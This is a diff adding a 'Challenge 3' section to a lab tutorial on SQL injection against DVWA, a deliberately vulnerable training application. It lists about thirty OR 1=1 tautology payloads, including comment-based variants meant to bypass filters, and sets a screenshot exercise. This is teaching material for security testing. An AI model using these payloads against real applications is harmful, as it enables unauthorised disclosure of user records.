@@ -31,3 +31,48 @@ Figure 3 shows a SQL error returned to the web application. A single-quotation m
 <img src="../images/sqli_3_sqlError.png" width="800" height="900">
 
 **Figure 3, SQL Error Indicating SQL Injection Point**
+
+### Challenge 3: Injecting a Malicious SQL Statement
+Once a tester discovers a SQL injection point, the next step is demonstrating the ability inject a malicious SQL statement. Common strings include TRUE condition SQL OR statements appended to the escape character (i.e, " or '). Some applications may prohibit spaces, text strings such as OR, or use other controls to reduce exposure to SQLi attacks. Following or different iterations of the same TRUE condition OR statement: **OR 1=1**.
+
+```
+or 1=1
+or '1=1
+or '1'='1
+or '1'='1'
+or 1=1#
+or '1=1'#
+or '1'='1'#
+or 1=1;#
+or '1=1';#
+or '1'='1';#
+||1=1
+||'1=1
+||'1'='1
+||'1'='1'
+||1=1#
+||'1=1'#
+||'1'='1'#
+||1=1;#
+||'1=1';#
+||'1'='1';#
+or/**/1=1
+or/**/'1=1
+or/**/'1'='1
+or/**/'1'='1'
+or/**/1=1#
+or/**/'1=1'#
+or/**/'1'='1'#
+or/**/1=1;#
+or/**/'1=1';#
+or/**/'1'='1';#
+```
+DVWA is vulnerable to a simple OR statement and will disclose all users. Figure 4 shows a succcessful SQLi attack using the string **'OR '1=1**.
+
+<img src="../images/sqli_4_sqiiProof.png" width="800" height="900">
+
+**Figure 4, SQLi Proof**
+
+
+**Capture a screenshot showing a successful SQLi attack against DVWA that discloses application users using a string other than "'OR '1=1".**
+
